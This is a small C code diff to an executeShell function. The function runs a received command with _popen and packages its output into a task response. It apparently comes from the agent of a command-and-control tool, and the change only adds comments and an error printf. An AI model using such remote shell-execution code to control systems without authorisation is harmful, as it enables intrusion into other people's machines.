@@ -12,16 +12,18 @@ BOOL executeShell(PParser arguments)
 	FILE* fp;
 	CHAR path[1035];
 
+	// Create the response package
 	PPackage responseTask = newPackage(0, TRUE);
 	addByte(responseTask, POST_RESPONSE);
 	addString(responseTask, taskUuid, FALSE);
 
+	// Temporary output to store the result
 	PPackage output = newPackage(0, FALSE);
 
 	fp = _popen(cmd, "rb");
 	if (!fp)
 	{
-		// ERROR
+		printf("[SHELL] Error in executeShell command");
 		return FALSE;
 	}
 	while (fgets(path, sizeof(path), fp) != nullptr)
